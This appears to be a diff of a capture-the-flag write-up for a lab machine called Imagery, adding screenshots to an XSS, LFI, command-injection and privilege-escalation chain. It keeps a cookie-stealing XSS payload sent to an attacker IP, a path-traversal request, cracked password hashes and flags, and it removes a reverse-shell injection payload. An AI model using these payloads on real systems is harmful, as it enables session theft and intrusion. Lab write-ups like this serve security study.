@@ -31,16 +31,23 @@ Since direct LFI was blocked by authorization, the goal was to steal a valid, pr
     <img src=x onerror=fetch("http://[YOUR_KALI_IP]:8888/?cookie="+document.cookie)>
     ```
 * **Execution:** A Python process (the admin bot) viewed the bug report, causing the script to execute and send the privileged cookie to the Netcat listener.
+<img width="1577" height="511" alt="Imagery_XSS_BurpSUite" src="https://github.com/user-attachments/assets/b3faafb9-d08a-4fd4-a2e1-69d2b9cfa31f" />
+<img width="933" height="253" alt="Imagery-NC cookie gotten" src="https://github.com/user-attachments/assets/bb27f154-c007-4912-bb7d-07aa3ed61a19" />
 
 ### 3. Data Extraction (LFI $\rightarrow$ Passwords)
+<img width="721" height="351" alt="ImageryGetSytemInfoFunction" src="https://github.com/user-attachments/assets/adbe6af4-34ac-4ede-be36-f7bdc4aeb657" />
 
-Using the newly captured privileged cookie (which bypassed the `403 FORBIDDEN` check), the LFI vulnerability was exploited to read sensitive files:
+Using the newly cap<img width="1694" height="872" alt="Imagery LFI Exploited" src="https://github.com/user-attachments/assets/2febfdb5-8092-4eba-938f-8995f09379a9" />
+tured privileged cookie (which bypassed the `403 FORBIDDEN` check), the LFI vulnerability was exploited to read sensitive files:
 
-* **LFI Success:** The payload successfully read the `/etc/passwd` file and the application path from `/proc/self/cmdline` (at `/home/web/web/`).
+* **LFI Success:** The payload successfully read the `/etc/passwd` file and the application path from `/proc/self/cmdline` (at `/home/web/web/`).<img width="1540" height="447" alt="Imagery-LFI2" src="https://github.com/user-attachments/assets/61bba9fc-17bb-4855-9077-2a2e0584a8e7" />
+
 * **Final Data Source:** The application's database file was located and downloaded:
     ```http
     GET /admin/get_system_log?log_identifier=../../../../../../../home/web/web/db.json
     ```
+    <img width="1617" height="944" alt="Imagery db json found in config py" src="https://github.com/user-attachments/assets/3052a8cd-a229-4c05-a5ab-7b297e7d2177" />
+
 * **Credentials Found:** The `db.json` file revealed weakly encrypted (MD5) user passwords:
     | User | Hash | Plaintext Password | Role |
     | :--- | :--- | :--- | :--- |
@@ -49,24 +56,15 @@ Using the newly captured privileged cookie (which bypassed the `403 FORBIDDEN` c
     | `mark@imagery.htb` | `01c3d2e5bdaf6134cec0a367cf53e535` | **`supersmash`** | **System User** |
 
 ### 4. RCE Execution (ImageMagick)
+<img width="682" height="481" alt="ApplyVisual Transform" src="https://github.com/user-attachments/assets/e9465f8c-8bf8-480c-b467-df1f5da224ad" />
 
 The application restricted the `/apply_visual_transform` RCE endpoint to users with the `isTestuser: true` flag.
+<img width="878" height="445" alt="TestUserCracked" src="https://github.com/user-attachments/assets/70b9aee5-6c64-4ba6-9fd4-ffb35e41cce6" />
 
 * **Final Login:** Logged in as **`testuser@imagery.htb` / `iambatman`** to obtain the correct session cookie.
 * **Injection:** The RCE was executed by injecting a shell command into the `height` parameter, which is passed to the ImageMagick (`/usr/bin/convert`) command line:
+<img width="687" height="537" alt="Imagery_revSEHELRequest" src="https://github.com/user-attachments/assets/8d8aa51d-e430-4c0d-b44d-7202b983ae4a" />
 
-    ```http
-    # Payload executed via Burp Repeater (Test User Cookie)
-    POST /apply_visual_transform
-    {
-      "imageId": "[...]",
-      "transformType": "crop",
-      "params": {
-        "x": 0, "y": 0, "width": 100,
-        "height": "100; /bin/bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1"
-      }
-    }
-    ```
 * **Result:** A reverse shell was established as the low-privileged **`web`** user.
 
 ---
@@ -80,6 +78,9 @@ The application restricted the `/apply_visual_transform` RCE endpoint to users w
     | Target Hash | Plaintext Password | Tool/Mode |
     | :--- | :--- | :--- |
     | `01c3d2e5bdaf6134cec0a367cf53e535` | **`supersmash`** | `hashcat -m 0 rockyou.txt` |
+  
+<img width="633" height="408" alt="Imagery MArk Passwoe" src="https://github.com/user-attachments/assets/2114c436-db42-44b0-9d97-48de5a251137" />
+
 
 * **SSH/SU:** Used the cracked password (`supersmash`) to switch user to `mark` and gain access to the user flag (`b074155730ad4e1f899f3afa9f583ec1`).
     ```bash
@@ -87,7 +88,6 @@ The application restricted the `/apply_visual_transform` RCE endpoint to users w
     # Password: supersmash
     mark@Imagery:~$ cat user.txt 
     ```
-
 ### 2. Exploiting the Custom Root Wrapper (`charcol`)
 
 The final escalation requires running a kernel exploit (`tc qdisc` commands) that is permission-blocked. The developer's intended solution was the custom wrapper **`charcol`** running as **root**.
@@ -102,6 +102,7 @@ The final escalation requires running a kernel exploit (`tc qdisc` commands) tha
 * **Result:** The kernel exploit sequence **(CVE-2025-21700 UAF)** was triggered by the root-executed script, dropping a **root shell**.
 
 ### 3. Final Flag Capture
+<img width="941" height="354" alt="THeFinalFlag" src="https://github.com/user-attachments/assets/f9930c03-da0c-4066-8e69-82128d719d80" />
 
 ```bash
 root@Imagery:/# cat /root/root.txt
